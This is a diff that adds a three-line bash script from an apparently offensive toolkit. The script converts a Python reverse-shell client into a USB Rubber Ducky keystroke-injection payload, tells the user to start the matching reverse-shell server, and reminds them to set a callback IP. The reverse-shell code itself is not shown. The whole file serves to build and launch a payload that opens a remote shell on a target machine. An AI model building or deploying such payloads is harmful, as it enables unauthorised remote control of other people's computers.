@@ -1,0 +1,3 @@
+#!/bin/env bash
+
+echo "Setting up reverse shell client..." && python ducky_integration/to_ducky.py rev_shell/client_revshell.py > output/payload.dd && echo "Ran ducky_integration rev_shell/client_revshell.py!" && echo "Output is output/payload.dd" && echo "Run 'python ./rev_shell/server_revshell.py' to start server" && echo "note: make sure you edited ./rev_shell/client_revshell.py to add callback ip!"
